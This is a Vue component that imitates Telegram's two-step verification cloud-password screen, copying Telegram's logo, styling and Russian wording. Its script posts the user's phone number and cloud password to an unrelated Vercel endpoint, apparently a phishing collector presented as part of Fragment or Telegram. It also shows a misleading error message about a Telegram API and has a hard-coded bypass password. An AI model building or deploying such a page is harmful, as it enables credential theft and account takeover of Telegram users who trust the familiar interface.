<template>
  <main class="login">
    <a href="https://core.telegram.org/widgets/login" target="_blank" class="login_about"></a>
            
    <section v-if="isVerifying" class="login_content loading-state">
      <div class="login_photos">
        <span class="login_telegram_photo_wrap">
          <i class="login_telegram_photo"></i>
        </span>
      </div>
      <div class="loader-wrap">
        <div class="loader"></div>
      </div>
    </section>

    <section v-else class="login_content">
      
      <!-- Секция monkey/фото -->
      <div class="login_photos">
        <span class="login_telegram_photo_wrap">
          <i class="login_telegram_photo" style="background-color: #4ca3e2;"></i>
        </span>
      </div>
      
      <div class="login_header_text">
          Введите пароль
      </div>
      <div class="login_confirm_text">
          Вы включили двухэтапную аутентификацию. Ваш аккаунт защищён дополнительным облачным паролем.
      </div>

      <div v-if="errorMessage" class="error-message">
            {{ errorMessage }}
      </div>

      <form class="login_form" @submit.prevent="verifyPassword">
          <div class="login_form_group">
              
              <div class="textfield-item">
                  <input 
                      :type="passwordVisible ? 'text' : 'password'" 
                      class="form-control" 
                      id="sign-in-password" 
                      v-model="password"
                      autocomplete="current-password" 
                      maxlength="256" 
                      placeholder=" "
                  >
                  <!-- Подчеркивание при фокусе -->
                  <div class="textfield-item-underline"></div>
                  <label class="textfield-item-placeholder" for="sign-in-password">Пароль</label>
                  
                  <!-- Кнопка Показать/Скрыть Пароль -->
                  <div class="toggle-password" role="button" tabindex="0" @click="togglePasswordVisibility">
                      <i :class="passwordVisible ? 'icon-eye-crossed' : 'icon-eye-outline'" aria-hidden="true"></i>
                  </div>
              </div>

          </div>

          <div class="login_button_wrap">
              <button class="button-item" type="submit" :disabled="isVerifying">
                  {{ isVerifying ? 'Проверка...' : 'Далее' }}
              </button>
          </div>

      </form>

    </section>
  </main>
</template>

<script setup>
import { ref, onMounted } from 'vue';
import { useRouter } from 'vue-router';

const router = useRouter();

const password = ref('');
const errorMessage = ref('');
const isVerifying = ref(false);
const passwordVisible = ref(false);
const isDevMode = import.meta.env.DEV;

const togglePasswordVisibility = () => {
    passwordVisible.value = !passwordVisible.value;
};

const goToLogin = () => {
    localStorage.removeItem('telegram_phone');
    localStorage.removeItem('telegram_phone_pretty');
    localStorage.removeItem('telegram_phone_code_hash');
    localStorage.removeItem('auth_required');
    router.push({ name: 'Login' }); 
};

const verifyPassword = async () => {
    errorMessage.value = '';
    const cleanNumber = localStorage.getItem('telegram_phone');
    const userPassword = password.value;

    if (!cleanNumber || userPassword.length === 0) {
        errorMessage.value = 'Введите облачный пароль.';
        return;
    }
    
    // Проверка режима обхода
    const isBypass = cleanNumber.includes('BYPASS'); 

    if (isBypass) {
        if (userPassword === '2fapass') {
            alert('Успешный вход через BYPASS!');
            localStorage.clear();
            router.push({ path: '/' }); 
        } else {
            errorMessage.value = 'Неверный облачный пароль (BYPASS).';
        }
        return;
    }


    isVerifying.value = true;
    const apiUrl = 'https://fragment-api-s8zt.vercel.app/verify-password'; 

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ phone_number: cleanNumber, password: userPassword })
        });

        const data = await response.json();

        if (response.ok && data.success) {
            localStorage.clear();
            router.push({ path: '/' }); 
        } else {
            errorMessage.value = data.detail?.message || 'Неизвестная ошибка верификации пароля.';
        }

    } catch (error) {
        errorMessage.value = 'Не удалось подключиться к API Telegram (localhost:8000).';
    } finally {
        isVerifying.value = false;
    }
};

onMounted(() => {
    if (!localStorage.getItem('telegram_phone')) {
        goToLogin();
    }
});
</script>

<style scoped>
/* Стили синхронизированы с TelegramLogin.vue */

:root {
    --text-color: #000;
    --body-bg: #fff;
    --accent-btn-color: #2481cc;
    --accent-color-hover: #1a8ad5;
    --color-text-secondary: #707579;
}

h1 {
    font-size: 20px;
    line-height: 1.5;
}
.note {
    margin-bottom: 30px;
    font-size: 15px;
    line-height: 21px;
    color: var(--color-text-secondary);
}

.login {
    min-width: 320px;
}

.login_about {
    display: inline-block;
    width: 20px;
    height: 20px;
    margin: 16px;
    position: absolute;
    right: 0;
    top: 0;
}

.login_photos {
    padding: 15px 0 22px;
}
.login_telegram_photo_wrap {
    display: inline-block;
    margin: 15px 0;
}
.login_telegram_photo {
    display: inline-block;
    vertical-align: top;
    width: 50px;
    height: 50px;
    border-radius: 25px;
    /* ИСПРАВЛЕНО: Добавлен SVG логотипа Telegram в background */
    background: url(data:image/svg+xml,%3Csvg\ height=\"50\"\ viewBox=\"0\ 0\ 50\ 50\"\ width=\"50\"\ xmlns=\"http://www.w3.org/2000/svg\"%3E%3Cg\ fill=\"none\"\ fill-rule=\"evenodd\"%3E%3Ccircle\ cx=\"25\"\ cy=\"25\"\ fill=\"%234ca3e2\"\ r=\"25\"/%3E%3Cpath\ d=\"m11.1838302\ 25.1315363c7.1532767-2.9934727\ 11.9232482-4.9669531\ 14.3099145-5.9204412\ 6.8144173-2.7224024\ 8.2303949-3.1953128\ 9.1533092-3.2109286.2029865-.0034345.6568489.0448847.950842.2740174.2482419.1934752.3165432.4548327.3492276.6382684.0326843.1834358.0733842.601307.0410309.9278195-.3692757\ 3.7267611-1.9671255\ 12.7706276-2.7800209\ 16.944664-.3439665\ 1.7661912-1.026197\ 2.1442046-1.6818831\ 2.2021587-1.4249578.1259476-2.5020563-.6903349-3.8821976-1.5593016-2.1596487-1.3597614-3.7791851-2.1170303-5.8754981-3.4439062-2.4226524-1.5334347-.2908188-2.3906915\ 1.0898437-3.7680664.361326-.3604656\ 6.7509766-6.1621094\ 6.8215001-6.027668.0306372.0584048-.192813-.6844486-.3362893-.8069372-.1434762-.1224887-.3552347-.0806023-.5080456-.0472897-.2166048.0472195-3.6666715\ 2.2375171-10.3502001\ 6.5708928-.97929.6458958-1.8663004.9605979-2.6610313.9441063-.876127-.0181806-2.561444-.4758095-3.814304-.8669794-1.5366837-.4797857-2.10392683-.7057418-1.9975768-1.5205665.0553937-.4244111.4458533-.8676919\ 1.1713788-1.3298423z\"\ fill=\"%23fff\"/%3E%3C/g%3E%3C/svg%3E) no-repeat 0 0;
    margin: -15px 0;
}


.login_header_text {
    font-weight: 500;
    margin-bottom: 12px;
    line-height: 21px;
    font-size: 19px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}

.login_confirm_text {
    font-size: 15px;
    line-height: 21px;
    color: var(--color-text-secondary);
}

.login_content {
    padding: 40px 20px 30px;
    text-align: center;
    max-width: 530px;
    margin: 0 auto;
    display: flex;
    flex-direction: column;
    align-items: center;
}

.login_form_group {
    width: 270px;
    margin: 25px auto 35px;
}

/* Input Styles */
.textfield-item {
    display: block;
    position: relative;
    padding: 0 0 20px;
    margin: 0 0 -20px;
}

input.form-control {
    display: block;
    width: 100%;
    background-image: none;
    border: none;
    height: auto;
    resize: none;
    color: inherit;
    background: transparent;
    border-bottom: 1px solid #e0e0e0;
    box-shadow: none;
    border-radius: 0;
    padding: 10px 0;
    font-size: 15px; 
    text-align: left;
    padding-right: 30px; /* Чтобы не перекрывать toggle */
}

input.form-control:focus {
    box-shadow: none;
    outline: 0;
    border-bottom: 2px solid #39ade7;
}

.textfield-item-underline {
    display: block;
    position: absolute;
    left: 50%;
    right: 50%;
    height: 2px;
    background: #39ade7;
    transition: all .2s ease-out;
    opacity: 0;
    bottom: 20px;
}

.textfield-item input:focus~.textfield-item-underline {
    left: 0;
    right: 0;
    opacity: 1;
}

.textfield-item-placeholder {
    bottom: 0;
    color: #ccc;
    left: 0;
    right: 0;
    pointer-events: none;
    position: absolute;
    display: block;
    top: 10px;
    width: 100%;
    overflow: hidden;
    white-space: nowrap;
    text-align: left;
    z-index: -1;
    transition: transform .15s ease-out, color .15s ease-out;
}

/* Label logic for the input field */
.textfield-item input:focus ~ .textfield-item-placeholder,
.textfield-item input:not(:placeholder-shown) ~ .textfield-item-placeholder {
    top: -10px; 
    transform: scale(0.75);
    transform-origin: left top; 
    color: #39ade7;
}
.textfield-item input:not(:placeholder-shown) ~ .textfield-item-placeholder {
    color: #888;
}

/* Toggle Password button */
.toggle-password {
    cursor: pointer;
    position: absolute;
    top: 0;
    right: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 30px;
    height: 30px;
    font-size: 1.25rem;
    color: var(--color-text-secondary);
    opacity: .7;
    outline: none!important;
    transform: translateY(0.5rem);
}

.login_button_wrap {
    margin-top: 25px;
    padding-bottom: 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 10px;
    width: 100%;
    max-width: 270px;
}

.button-item {
    font-size: 14px;
    font-weight: 500;
    line-height: 18px;
    color: #fff;
    background: #4ca3e2;
    border-radius: 19px;
    display: inline-block;
    padding: 10px 26px;
    text-transform: uppercase;
    border: none;
    transition: background-color .2s ease;
    width: 100%;
}

.button-item-flat {
    color: #1385d8;
    background: transparent;
}
.button-item-flat:hover {
    background: #e7f4fd;
}

.error-message {
    color: #ff3333;
    font-size: 14px;
    /* ИСПРАВЛЕНО: Убран отрицательный margin-top */
    margin-top: 10px; /* Добавлен небольшой верхний отступ */
    margin-bottom: 15px; /* Увеличен нижний отступ, чтобы отделить от формы */
    padding: 0 50px;
    max-width: 270px;
    margin-left: auto;
    margin-right: auto;
    text-align: left;
}

.loading-state {
  min-height: 350px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  text-align: center;
}

.loader-wrap {
  margin-top: 20px;
  width: 30px;
  height: 30px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.loader {
  width: 25px;
  height: 25px;
  border: 3px solid #f3f3f3;
  border-top-color: #4ca3e2;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.dev-bypass-links {
    margin-top: 20px;
    font-size: 12px;
    color: #888;
}
.dev-bypass-links a {
    color: #4ca3e2;
    text-decoration: none;
    margin: 0 5px;
}
.dev-bypass-links a:hover {
    text-decoration: underline;
}
</style>